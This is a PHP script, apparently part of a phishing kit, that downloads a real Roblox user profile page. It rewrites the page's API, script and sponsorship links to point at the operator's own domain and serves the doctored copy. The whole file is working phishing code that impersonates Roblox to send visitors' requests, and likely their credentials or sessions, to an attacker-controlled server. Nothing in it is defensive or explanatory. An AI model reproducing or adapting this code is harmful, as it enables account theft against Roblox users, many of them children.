<?php
include('../../includes/functions.php');
$realUsername = "TTVBattuy";
$fakeUsername = "testasdwa";
$userId = requestId($realUsername);
$session = "test";
// ----------------------------------------------------------------
$apisList = file_get_contents("../../stub/phishing/replaces/apis.txt");
$apisListW = file_get_contents("$domain/stub/phishing/replaces/apis.php?userid=$userId");
$torture = file_get_contents("../../stub/phishing/replaces/torture.txt");
$tortureWith = file_get_contents("$domain/stub/phishing/replaces/torture.php?userId=$userId&session=$session&friends=1");
$lol = file_get_contents("../../stub/phishing/replaces/lol.txt");
$lolw = file_get_contents("$domain/stub/phishing/replaces/lol.php?userid=$userId");
$lmao = file_get_contents("../../stub/phishing/replaces/lmao.txt");
$lmaowith = file_get_contents("$domain/stub/phishing/replaces/lmao.php?userid=$userId");
$eh = file_get_contents("../../stub/phishing/replaces/eh.txt");
$ehw = file_get_contents("$domain/stub/phishing/replaces/eh.php?userid=$userId");
// ----------------------------------------------------------------

    $config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
    $url = "https://www.roblox.com/users/$userId/profile";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($ch);
    curl_close($ch);

    $content = str_replace($apisList, $apisListW, $content);
    $content = str_replace($torture, $tortureWith, $content);
    $content = str_replace($lol, $lolw, $content);
    $content = str_replace($lmao, $lmaowith, $content);
    $content = str_replace($eh, $ehw, $content);
    $content = str_replace("https://www.roblox.com/user-sponsorship/1", "$domain/web/sponsorship.php?id=1", $content);
    $content = str_replace("https://www.roblox.com/user-sponsorship/2", "$domain/web/sponsorship.php?id=2", $content);
    $content = str_replace("https://www.roblox.com/user-sponsorship/3", "$domain/web/sponsorship.php?id=3", $content);
    
    //debug
    echo $content;

?>